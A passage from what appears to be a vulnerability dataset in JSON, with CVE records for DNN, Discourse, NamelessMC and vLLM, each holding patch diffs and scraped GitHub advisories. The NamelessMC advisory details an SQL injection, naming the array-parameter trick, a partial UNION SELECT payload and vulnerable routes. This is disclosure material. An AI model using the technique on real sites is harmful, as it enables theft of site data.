description=\"string\"                        Description of what the provider does\n+        <!-- Configuration for AspNetSqlMembershipProvider:\r\n+                connectionStringName=\"string\"               Name corresponding to the entry in <connectionStrings> section where the connection string for the provider is specified\r\n+                maxInvalidPasswordAttempts=\"int\"            The number of failed password attempts, or failed password answer attempts that are allowed before locking out a user?s account\r\n+                passwordAttemptWindow=\"int\"                 The time window, in minutes, during which failed password attempts and failed password answer attempts are tracked\r\n+                enablePasswordRetrieval=\"[true|false]\"      Should the provider support password retrievals\r\n+                enablePasswordReset=\"[true|false]\"          Should the provider support password resets\r\n+                requiresQuestionAndAnswer=\"[true|false]\"    Should the provider require Q & A\r\n+                minRequiredPasswordLength=\"int\"\t\t        The minimum password length\r\n+                minRequiredNonalphanumericCharacters=\"int\"  The minimum number of non-alphanumeric characters\r\n+                applicationName=\"string\"                    Optional string to identity the application: defaults to Application Metabase path\r\n+                requiresUniqueEmail=\"[true|false]\"          Should the provider require a unique email to be specified\r\n+                passwordFormat=\"[Clear|Hashed|Encrypted]\"   Storage format for the password: Hashed (SHA1), Clear or Encrypted (Triple-DES)\r\n+                description=\"string\"                        Description of what the provider does\r\n                 -->\n         <add name=\"AspNetSqlMembershipProvider\" type=\"System.Web.Security.SqlMembershipProvider\" connectionStringName=\"SiteSqlServer\" enablePasswordRetrieval=\"false\" enablePasswordReset=\"true\" requiresQuestionAndAnswer=\"false\" minRequiredPasswordLength=\"7\" minRequiredNonalphanumericCharacters=\"0\" requiresUniqueEmail=\"false\" passwordFormat=\"Hashed\" applicationName=\"DotNetNuke\" description=\"Stores and retrieves membership data from the local Microsoft SQL Server database\"/>\n       </providers>\n\n@@ -443,8 +445,8 @@\n<compositeFiles defaultFileProcessingProvider=\"DnnCompositeFileProcessor\" compositeFileHandlerPath=\"~/DependencyHandler.axd\">\n       <fileProcessingProviders>\n         <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"MappedId\" />\n-        <!-- For webfarms remove the above CompositeFileProcessor and uncomment this section\n-                                                <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"Base64QueryStrings\" />\n+        <!-- For webfarms remove the above CompositeFileProcessor and uncomment this section\r\n+                                                <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"Base64QueryStrings\" />\r\n                                                 -->\n         <add name=\"DnnCompositeFileProcessor\" type=\"DotNetNuke.Web.Client.Providers.DnnCompositeFileProcessingProvider, DotNetNuke.Web.Client\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"MappedId\" />\n       </fileProcessingProviders>\n```\n\nFilename: DNN Platform/Website/release.config:\n```\n@@ -37,8 +37,8 @@\n<connectionStrings>\n     <!-- Connection String for SQL Server 2008/2012 Express -->\n     <add name=\"SiteSqlServer\" connectionString=\"Data Source=.\\SQLExpress;Integrated Security=True;User Instance=True;AttachDBFilename=|DataDirectory|Database.mdf;\" providerName=\"System.Data.SqlClient\"/>\n-    <!-- Connection String for SQL Server 2008/2012\n-    <add name=\"SiteSqlServer\" connectionString=\"Server=(local);Database=DotNetNuke;uid=;pwd=;\" providerName=\"System.Data.SqlClient\" />\n+    <!-- Connection String for SQL Server 2008/2012\r\n+    <add name=\"SiteSqlServer\" connectionString=\"Server=(local);Database=DotNetNuke;uid=;pwd=;\" providerName=\"System.Data.SqlClient\" />\r\n     -->\n   </connectionStrings>\n\n@@ -55,7 +55,7 @@\n<!--optionally strip angle brackets on public login and registration screens-->\n     <add key=\"PersistentCookieTimeout\" value=\"0\"/>\n     <!--use as persistent cookie expiration. Value is in minutes, and only active if a non-zero figure-->\n-    <!-- set UsePortNumber to true to preserve the port number if you're using a port number other than 80 (the standard)\n+    <!-- set UsePortNumber to true to preserve the port number if you're using a port number other than 80 (the standard)\r\n         <add key=\"UsePortNumber\" value=\"true\" /> -->\n     <!-- Services Framework Tracing is primarily useful for developing and debugging -->\n     <add key=\"EnableServicesFrameworkTracing\" value=\"false\" />\n\n@@ -64,7 +64,9 @@\n<add key=\"loginUrl\" value=\"~/Login.aspx\" />\n     <add key=\"ValidationSettings:UnobtrusiveValidationMode\" value=\"None\" />\n     <add key=\"MobileViewSiteCookieName\" value=\"dnn_IsMobile\" />\n-    <add key=\"DisableMobileViewSiteCookieName\" value=\"dnn_NoMobile\" />\n+    <add key=\"DisableMobileViewSiteCookieName\" value=\"dnn_NoMobile\" />\r\n+    <!-- Can be set to true to allow the image handler to display text passed in the querystring. -->\r\n+    <add key=\"AllowDnnImagePlaceholderText\" value=\"false\" />\n   </appSettings>\n \n   <system.web.webPages.razor>\n\n@@ -126,8 +128,8 @@\n<system.web>\n     <machineKey validationKey=\"F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902\" decryptionKey=\"F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902F8D923AC\" decryption=\"3DES\" validation=\"SHA1\"/>\n-    <!-- set code access security trust level - this is generally set in the machine.config\n-    <trust level=\"Full\" originUrl=\".*\" />\n+    <!-- set code access security trust level - this is generally set in the machine.config\r\n+    <trust level=\"Full\" originUrl=\".*\" />\r\n     -->\n     <!-- set debugmode to false for running application -->\n     <compilation debug=\"false\" strict=\"false\" targetFramework=\"4.7.2\">\n\n@@ -149,19 +151,19 @@\n<authentication mode=\"Forms\">\n       <forms name=\".DOTNETNUKE\" protection=\"All\" timeout=\"60\" cookieless=\"UseCookies\"/>\n     </authentication>\n-    <!--\n-    <identity impersonate=\"true\"/>\n-    <authentication mode=\"Windows\">\n-    </authentication>\n+    <!--\r\n+    <identity impersonate=\"true\"/>\r\n+    <authentication mode=\"Windows\">\r\n+    </authentication>\r\n     -->\n     <!-- allow large file uploads -->\n     <httpRuntime targetFramework=\"4.7.2\" shutdownTimeout=\"120\" executionTimeout=\"1200\" useFullyQualifiedRedirectUrl=\"true\" maxRequestLength=\"28672\" requestLengthDiskThreshold=\"81920\" maxUrlLength=\"2048\" requestPathInvalidCharacters=\"&lt;,&gt;,*,%,:,\\,?\" enableVersionHeader=\"false\"  requestValidationMode=\"2.0\" fcnMode=\"Single\" />\n     <httpCookies httpOnlyCookies=\"true\" requireSSL=\"false\" domain=\"\"/>\n-    <!--  GLOBALIZATION\n-    This section sets the globalization settings of the application.\n-    Utf-8 is not supported on Netscape 4.x\n-    If you need netscape compatiblity leave iso-8859-1.\n-    UTF-8 is recommended for complex languages\n+    <!--  GLOBALIZATION\r\n+    This section sets the globalization settings of the application.\r\n+    Utf-8 is not supported on Netscape 4.x\r\n+    If you need netscape compatiblity leave iso-8859-1.\r\n+    UTF-8 is recommended for complex languages\r\n     -->\n     <globalization culture=\"en-US\" uiCulture=\"en\" requestEncoding=\"UTF-8\" responseEncoding=\"UTF-8\" fileEncoding=\"UTF-8\"/>\n     <!--<globalization culture=\"en-US\" uiCulture=\"en\"  fileEncoding=\"iso-8859-1\" requestEncoding=\"iso-8859-1\" responseEncoding=\"iso-8859-1\"/>-->\n\n@@ -193,33 +195,33 @@\n</controls>\n     </pages>\n     <!-- ASP.NET 2 Membership/Profile/Role and AnonymousAuthentication Providers -->\n-    <!-- anonymousIdentification configuration:\n-          enabled=\"[true|false]\"                              Feature is enabled?\n-          cookieName=\".ASPXANONYMOUS\"                         Cookie Name\n-          cookieTimeout=\"100000\"                              Cookie Timeout in minutes\n-          cookiePath=\"/\"                                      Cookie Path\n-          cookieRequireSSL=\"[true|false]\"                     Set Secure bit in Cookie\n-          cookieSlidingExpiration=\"[true|false]\"              Reissue expiring cookies?\n-          cookieProtection=\"[None|Validation|Encryption|All]\" How to protect cookies from being read/tampered\n-          domain=\"[domain]\"                                   Enables output of the \"domain\" cookie attribute set to the specified value\n+    <!-- anonymousIdentification configuration:\r\n+          enabled=\"[true|false]\"                              Feature is enabled?\r\n+          cookieName=\".ASPXANONYMOUS\"                         Cookie Name\r\n+          cookieTimeout=\"100000\"                              Cookie Timeout in minutes\r\n+          cookiePath=\"/\"                                      Cookie Path\r\n+          cookieRequireSSL=\"[true|false]\"                     Set Secure bit in Cookie\r\n+          cookieSlidingExpiration=\"[true|false]\"              Reissue expiring cookies?\r\n+          cookieProtection=\"[None|Validation|Encryption|All]\" How to protect cookies from being read/tampered\r\n+          domain=\"[domain]\"                                   Enables output of the \"domain\" cookie attribute set to the specified value\r\n         -->\n     <anonymousIdentification enabled=\"true\" cookieName=\".ASPXANONYMOUS\" cookieTimeout=\"100000\" cookiePath=\"/\" cookieRequireSSL=\"false\" cookieSlidingExpiration=\"true\" cookieProtection=\"None\" domain=\"\"/>\n     <membership defaultProvider=\"AspNetSqlMembershipProvider\" userIsOnlineTimeWindow=\"15\">\n       <providers>\n         <clear/>\n-        <!-- Configuration for AspNetSqlMembershipProvider:\n-                connectionStringName=\"string\"               Name corresponding to the entry in <connectionStrings> section where the connection string for the provider is specified\n-                maxInvalidPasswordAttempts=\"int\"            The number of failed password attempts, or failed password answer attempts that are allowed before locking out a user?s account\n-                passwordAttemptWindow=\"int\"                 The time window, in minutes, during which failed password attempts and failed password answer attempts are tracked\n-                enablePasswordRetrieval=\"[true|false]\"      Should the provider support password retrievals\n-                enablePasswordReset=\"[true|false]\"          Should the provider support password resets\n-                requiresQuestionAndAnswer=\"[true|false]\"    Should the provider require Q & A\n-                minRequiredPasswordLength=\"int\"\t\t        The minimum password length\n-                minRequiredNonalphanumericCharacters=\"int\"  The minimum number of non-alphanumeric characters\n-                applicationName=\"string\"                    Optional string to identity the application: defaults to Application Metabase path\n-                requiresUniqueEmail=\"[true|false]\"          Should the provider require a unique email to be specified\n-                passwordFormat=\"[Clear|Hashed|Encrypted]\"   Storage format for the password: Hashed (SHA1), Clear or Encrypted (Triple-DES)\n-                description=\"string\"                        Description of what the provider does\n+        <!-- Configuration for AspNetSqlMembershipProvider:\r\n+                connectionStringName=\"string\"               Name corresponding to the entry in <connectionStrings> section where the connection string for the provider is specified\r\n+                maxInvalidPasswordAttempts=\"int\"            The number of failed password attempts, or failed password answer attempts that are allowed before locking out a user?s account\r\n+                passwordAttemptWindow=\"int\"                 The time window, in minutes, during which failed password attempts and failed password answer attempts are tracked\r\n+                enablePasswordRetrieval=\"[true|false]\"      Should the provider support password retrievals\r\n+                enablePasswordReset=\"[true|false]\"          Should the provider support password resets\r\n+                requiresQuestionAndAnswer=\"[true|false]\"    Should the provider require Q & A\r\n+                minRequiredPasswordLength=\"int\"\t\t        The minimum password length\r\n+                minRequiredNonalphanumericCharacters=\"int\"  The minimum number of non-alphanumeric characters\r\n+                applicationName=\"string\"                    Optional string to identity the application: defaults to Application Metabase path\r\n+                requiresUniqueEmail=\"[true|false]\"          Should the provider require a unique email to be specified\r\n+                passwordFormat=\"[Clear|Hashed|Encrypted]\"   Storage format for the password: Hashed (SHA1), Clear or Encrypted (Triple-DES)\r\n+                description=\"string\"                        Description of what the provider does\r\n                 -->\n         <add name=\"AspNetSqlMembershipProvider\" type=\"System.Web.Security.SqlMembershipProvider\" connectionStringName=\"SiteSqlServer\" enablePasswordRetrieval=\"false\" enablePasswordReset=\"true\" requiresQuestionAndAnswer=\"false\" minRequiredPasswordLength=\"7\" minRequiredNonalphanumericCharacters=\"0\" requiresUniqueEmail=\"false\" passwordFormat=\"Hashed\" applicationName=\"DotNetNuke\" description=\"Stores and retrieves membership data from the local Microsoft SQL Server database\"/>\n       </providers>\n\n@@ -440,8 +442,8 @@\n<compositeFiles defaultFileProcessingProvider=\"DnnCompositeFileProcessor\" compositeFileHandlerPath=\"~/DependencyHandler.axd\">\n       <fileProcessingProviders>\n         <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"MappedId\" />\n-        <!-- For webfarms remove the above CompositeFileProcessor and uncomment this section\n-                                                <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"Base64QueryStrings\" />\n+        <!-- For webfarms remove the above CompositeFileProcessor and uncomment this section\r\n+                                                <add name=\"CompositeFileProcessor\" type=\"ClientDependency.Core.CompositeFiles.Providers.CompositeFileProcessingProvider, ClientDependency.Core\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"Base64QueryStrings\" />\r\n                                                 -->\n         <add name=\"DnnCompositeFileProcessor\" type=\"DotNetNuke.Web.Client.Providers.DnnCompositeFileProcessingProvider, DotNetNuke.Web.Client\" enableCssMinify=\"false\" enableJsMinify=\"true\" persistFiles=\"true\" compositeFilePath=\"~/App_Data/ClientDependency\" bundleDomains=\"\" urlType=\"MappedId\" />\n       </fileProcessingProviders>\n```",
                "url": "https://github.com/dnnsoftware/Dnn.Platform/commit/5def7cc2e7931bb1041b21540bde99f96874a5a9"
            }
        ],
        "published_date": "2025-04-09T15:14:29.025Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ndnnsoftware\n/\nDnn.Platform\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 757\nStar 1.1k\nCode\nIssues\n253\nPull requests\n11\nDiscussions\nActions\nProjects\n1\nSecurity\n6\nInsights\nAdditional navigation options\nUnexpected external content may be displayed in ImageHandler\nModerate valadas published GHSA-2rrc-g594-rhqw on Apr 7Apr 8, 2025\nPackage\nDotNetNuke\n(Manual Install)\nAffected versions\n<9.13.4\nPatched versions\n9.13.4\nDescription\nAn url could be crafted to the DNN ImageHandler to render text from a querystring parameter. This text would display in the resulting image and a user that trusts the domain might think that the information is legitimate.\nSeverity\nModerate\n4.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N\nCVE ID\nCVE-2025-32371\nWeaknesses\nNo CWEs\nCredits\nleedavi\nRemediation developer\nvaladas\nRemediation developer\nmitchelsellers\nRemediation reviewer\ndavid-poindexter\nRemediation reviewer\nbdukes\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory describes the nature of the vulnerability but does not provide concrete steps or a proof of concept to reproduce it.",
                "url": "https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-2rrc-g594-rhqw"
            }
        ],
        "sw_version": "v9.13.4-rc1",
        "sw_version_wget": "https://github.com/dnnsoftware/Dnn.Platform/archive/refs/tags/v9.13.4-rc1.zip"
    },
    "CVE-2025-32376": {
        "cwe": [
            {
                "id": "CWE-284",
                "value": "CWE-284: Improper Access Control"
            }
        ],
        "description": "Discourse is an open-source discussion platform. Prior to versions 3.4.3 on the stable branch and 3.5.0.beta3 on the beta branch, the users limit for a DM can be bypassed, thus giving the ability to potentially create a DM with every user from a site in it. This issue has been patched in stable version 3.4.3 and beta version 3.5.0.beta3.",
        "languages": [
            "Ruby",
            "JavaScript"
        ],
        "patch_commits": [
            {
                "content": "SECURITY: Enforce DM limits properly\n\nWhen adding people to a DM, the ones already in the channel weren\u2019t\ntaken into account when checking whether the maximum limit was reached.\n\nFilename: plugins/chat/app/services/chat/add_users_to_channel.rb:\n```\n@@ -31,11 +31,13 @@\nclass AddUsersToChannel\n       attribute :channel_id, :integer\n \n       validates :channel_id, presence: true\n-      validate :target_presence\n-\n-      def target_presence\n-        usernames.present? || groups.present?\n-      end\n+      validates :usernames, presence: true, if: -> { groups.blank? }\n+      validates :usernames,\n+                length: {\n+                  maximum: SiteSetting.chat_max_direct_message_users,\n+                },\n+                allow_blank: true\n+      validates :groups, presence: true, if: -> { usernames.blank? }\n     end\n \n     lock(:channel_id) do\n\n@@ -61,16 +63,16 @@\ndef fetch_channel(params:)\n     def can_add_users_to_channel(guardian:, channel:)\n       return false if !guardian.user.admin? && !channel.joined_by?(guardian.user)\n \n-      channel.direct_message_channel? && (channel.chatable.group || channel.messages_count == 0)\n+      channel.direct_message_channel? && (channel.chatable.group? || channel.messages_count == 0)\n     end\n \n-    def fetch_target_users(params:, channel:)\n+    def fetch_target_users(params:, channel:, guardian:)\n       ::Chat::UsersFromUsernamesAndGroupsQuery.call(\n         usernames: params.usernames,\n         groups: params.groups,\n         excluded_user_ids: channel.chatable.direct_message_users.pluck(:user_id),\n         dm_channel: channel.direct_message_channel?,\n-      )\n+      ) + channel.chatable.users.where.not(id: guardian.user)\n     end\n \n     def upsert_memberships(channel:, target_users:)\n```\n\nFilename: plugins/chat/spec/services/chat/add_users_to_channel_spec.rb:\n```\n@@ -2,11 +2,32 @@\nRSpec.describe Chat::AddUsersToChannel do\n   describe described_class::Contract, type: :model do\n-    subject(:contract) { described_class.new(usernames: [], channel_id: nil) }\n+    subject(:contract) { described_class.new(usernames:, groups:) }\n+\n+    let(:usernames) { \"user1\" }\n+    let(:groups) { \"group1\" }\n \n     it { is_expected.to validate_presence_of :channel_id }\n-    it { is_expected.to validate_presence_of :usernames if :groups.blank? }\n-    it { is_expected.to validate_presence_of :groups if :usernames.blank? }\n+    it do\n+      is_expected.to validate_length_of(:usernames)\n+        .is_at_most(SiteSetting.chat_max_direct_message_users)\n+        .as_array\n+        .allow_nil\n+    end\n+\n+    context \"when 'usernames' is blank\" do\n+      let(:usernames) { nil }\n+\n+      it { is_expected.to validate_presence_of :groups }\n+      it { is_expected.not_to validate_presence_of :usernames }\n+    end\n+\n+    context \"when 'groups' is blank\" do\n+      let(:groups) { nil }\n+\n+      it { is_expected.to validate_presence_of :usernames }\n+      it { is_expected.not_to validate_presence_of :groups }\n+    end\n   end\n \n   describe \".call\" do\n\n@@ -57,14 +78,6 @@\nend\n       end\n \n-      it \"doesn't include existing direct message users\" do\n-        Chat::DirectMessageUser.create!(user: users.first, direct_message: direct_message)\n-\n-        expect(result.target_users.map(&:username)).to contain_exactly(\n-          *users[1..-1].map(&:username),\n-        )\n-      end\n-\n       it \"doesn't include users with dms disabled\" do\n         users.first.user_option.update!(allow_private_messages: false)\n\n@@ -102,14 +115,46 @@\nexpect(message.user).to eq(Discourse.system_user)\n         end\n       end\n+\n+      context \"when there are already some users in the channel\" do\n+        before do\n+          users\n+            .first(3)\n+            .map do |user|\n+              direct_message.users << user\n+              channel.add(user)\n+            end\n+        end\n+\n+        it \"only notifies the newly added users\" do\n+          expect(result.added_user_ids).to eq users.last(2).map(&:id)\n+        end\n+      end\n     end\n \n-    context \"when users exceed max direct message user limit\" do\n+    context \"when provided users exceed max direct message user limit\" do\n       before { SiteSetting.chat_max_direct_message_users = 4 }\n \n       it { is_expected.to fail_a_policy(:satisfies_dms_max_users_limit) }\n     end\n \n+    context \"when channel is already at maximum capacity\" do\n+      before do\n+        SiteSetting.chat_max_direct_message_users = 3\n+        users\n+          .first(3)\n+          .map do |user|\n+            direct_message.users << user\n+            channel.add(user)\n+          end\n+        params[:usernames] = users.last(2).map(&:username)\n+      end\n+\n+      context \"when trying to add other users\" do\n+        it { is_expected.to fail_a_policy(:satisfies_dms_max_users_limit) }\n+      end\n+    end\n+\n     context \"when channel is not found\" do\n       before { params[:channel_id] = -999 }\n```",
                "url": "https://github.com/discourse/discourse/commit/21a7f3162221c393f9bb13721451aa7f237d881a"
            }
        ],
        "published_date": "2025-04-30T14:55:21.473Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ndiscourse\n/\ndiscourse\nPublic\nNotifications You must be signed in to change notification settings\nFork 8.5k\nStar 44k\nCode\nPull requests\n65\nActions\nSecurity\n147\nInsights\nAdditional navigation options\nDM limits aren\u2019t always properly enforced\nModerate tgxworld published GHSA-mqqq-h2x3-46fr 3 weeks agoApr 29, 2025\nPackage\nDiscourse\n(Discourse)\nAffected versions\nstable <= 3.4.2; beta <= 3.5.0.beta2\nPatched versions\nstable >= 3.4.3; beta >= 3.5.0.beta3\nDescription\nImpact\nThe users limit for a DM can be bypassed, thus giving the ability to potentially create a DM with every user from a site in it.\nPatches\nThis issue is patched in the latest stable, beta and tests-passed versions of Discourse.\nWorkarounds\nNone.\nReferences\nSeverity\nModerate\n4.8\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nLow\nUser interaction\nActive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:L\nCVE ID\nCVE-2025-32376\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include a proof of concept or detailed steps to reproduce the vulnerability.",
                "url": "https://github.com/discourse/discourse/security/advisories/GHSA-mqqq-h2x3-46fr"
            }
        ],
        "sw_version": "v3.4.2",
        "sw_version_wget": "https://github.com/discourse/discourse/archive/refs/tags/v3.4.2.zip"
    },
    "CVE-2025-32389": {
        "cwe": [
            {
                "id": "CWE-89",
                "value": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
            }
        ],
        "description": "NamelessMC is a free, easy to use & powerful website software for Minecraft servers. Prior to version 2.1.4, NamelessMC is vulnerable to SQL injection by providing an unexpected square bracket GET parameter syntax. Square bracket GET parameter syntax refers to the structure `?param[0]=a&param[1]=b&param[2]=c` utilized by PHP, which is parsed by PHP as `$_GET['param']` being of type array. This issue has been patched in version 2.1.4.",
        "languages": [
            "PHP",
            "Smarty"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nCo-authored-by: Sam <samerton@users.noreply.github.com>\n\nFilename: core/classes/Database/DB.php:\n```\n@@ -529,7 +529,7 @@\npublic static function makeWhere(array $clauses): array\n         $where_clauses = [];\n         foreach ($clauses as $clause) {\n             if (!is_array($clause)) {\n-                continue;\n+                throw new InvalidArgumentException('Where clause must be an array');\n             }\n \n             if (count($clause) !== count($clause, COUNT_RECURSIVE)) {\n```",
                "url": "https://github.com/NamelessMC/Nameless/commit/02c81c7c45b98fad1ebe3bc085efae18aec4566f"
            }
        ],
        "published_date": "2025-04-18T15:56:39.962Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nNamelessMC\n/\nNameless\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 317\nStar 632\nCode\nIssues\n111\nPull requests\n19\nDiscussions\nActions\nWiki\nSecurity\n8\nInsights\nAdditional navigation options\nSQL Injection using PHP square bracket GET parameter syntax\nCritical samerton published GHSA-5984-mhcp-cq2x last monthApr 17, 2025\nPackage\nNo package listed\nAffected versions\n<= 2.1.3\nPatched versions\n2.1.4\nDescription\nDescription\nNamelessMC is vulnerable to SQL injection by providing unexpected square bracket GET parameter syntax\nSquare bracket GET parameter syntax refers to the structure ?param[0]=a&param[1]=b&param[2]=c utilised by PHP, which is parsed by PHP as $_GET['param'] which is then of type array.\nThe method DB::makeWhere, which is used in many places to construct a MySQL statement, allows constructing WHERE clauses in several formats, such as\nmakeWhere(['id', '=', 1]); // where ID = 1\nmakeWhere(['id', 1]) // also where ID = 1\nAn example of where makeWhere is called is through the DB::get() method, such as\n$db = DB::getInstance();\n$db->get('table_name', ['id', $_GET['id']]);\nwhere $_GET['id'] is passed in directly from GET request parameters - intended to be passed through to makeWhere as ['id', 1] if $_GET['id'] equals 1.\nConsider $_GET['id'] is now provided using PHP's square bracket syntax - e.g. ?id[0]=a&id[1]=b - this will reach makeWhere as ['id', ['a', 'b']\nIn makeWhere is the following check\n  if (!is_array($clause)) {\n    continue;\n  }\nIf parameters are passed into makeWhere with structure [string, array] as above, then this check will be truthy and the loop will continue, meaning makeWhere will now move onto ['a', 'b'], treating 'a' as the table name and 'b' as the value to check in there WHERE clause. As table names are not parameterised, this is passed into the SQL query raw and thus opens the system to SQL injection.\nAn example of this, in a blind fashion, is on the route /user/messaging (modules/Core/pages/user/messaging.php, on action=new line 294). The uid query param is passed to the DB#get method without any validation. So you can pass the parameter in question as an array (uid[0]=thing&uid[1]thing2&...) and by the behaviour of DB#makeWhere, a WHERE clause can be created with an arbitrary table name like:\nthing` = 'uwu' UNION SELECT ... #\nand bypass the parametrized queries. As the page only puts valid usernames on the To field, it can be used to slowly extract data using boolean logic.\nAnother example is present on /panel/users/reports (modules/Core/pages/panel/users_reports.php, line 190) on the id parameter. But on this one the user can clearly see the result of the query being made.\nTo abuse the first one the attacker just needs to have the \"Member\" role and for the second, the attacker must have a role that can view user reports.\nImpact\nAn attacker can use this to dump internal and sensitive data from the website.\nSeverity\nCritical\n9.3\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N\nCVE ID\nCVE-2025-32389\nWeaknesses\nCWE-89\nCredits\nVz0n\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The security advisory provides both a detailed explanation of the vulnerability and examples of how it can be exploited.",
                "url": "https://github.com/NamelessMC/Nameless/security/advisories/GHSA-5984-mhcp-cq2x"
            }
        ],
        "sw_version": "v2.1.3",
        "sw_version_wget": "https://github.com/NamelessMC/Nameless/archive/refs/tags/v2.1.3.zip"
    },
    "CVE-2025-32444": {
        "cwe": [
            {
                "id": "CWE-502",
                "value": "CWE-502: Deserialization of Untrusted Data"
            }
        ],
        "description": "vLLM is a high-throughput and memory-efficient inference and serving engine for LLMs. Versions starting from 0.6.5 and prior to 0.8.5, having vLLM integration with mooncake, are vulnerable to remote code execution due to using pickle based serialization over unsecured ZeroMQ sockets. The vulnerable sockets were set to listen on all network interfaces, increasing the likelihood that an attacker is able to reach the vulnerable ZeroMQ sockets to carry out an attack. vLLM instances that do not make use of the mooncake integration are not vulnerable. This issue has been patched in version 0.8.5.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "[Security] Use safe serialization and fix zmq setup for mooncake pipe (#17192)\n\nSigned-off-by: Shangming Cai <caishangming@linux.alibaba.com>\nCo-authored-by: Shangming Cai <caishangming@linux.alibaba.com>\n\nFilename: vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py:\n```\n@@ -2,6 +2,7 @@\nimport json\n import os\n+import struct\n from concurrent.futures import ThreadPoolExecutor\n from dataclasses import dataclass\n from typing import Optional, Union\n\n@@ -115,14 +116,14 @@\ndef _setup_metadata_sockets(self, kv_rank: int, p_host: str, p_port: str,\n         p_rank_offset = int(p_port) + 8 + self.local_rank * 2\n         d_rank_offset = int(d_port) + 8 + self.local_rank * 2\n         if kv_rank == 0:\n-            self.sender_socket.bind(f\"tcp://*:{p_rank_offset + 1}\")\n+            self.sender_socket.bind(f\"tcp://{p_host}:{p_rank_offset + 1}\")\n             self.receiver_socket.connect(f\"tcp://{d_host}:{d_rank_offset + 1}\")\n             self.sender_ack.connect(f\"tcp://{d_host}:{d_rank_offset + 2}\")\n-            self.receiver_ack.bind(f\"tcp://*:{p_rank_offset + 2}\")\n+            self.receiver_ack.bind(f\"tcp://{p_host}:{p_rank_offset + 2}\")\n         else:\n             self.receiver_socket.connect(f\"tcp://{p_host}:{p_rank_offset + 1}\")\n-            self.sender_socket.bind(f\"tcp://*:{d_rank_offset + 1}\")\n-            self.receiver_ack.bind(f\"tcp://*:{d_rank_offset + 2}\")\n+            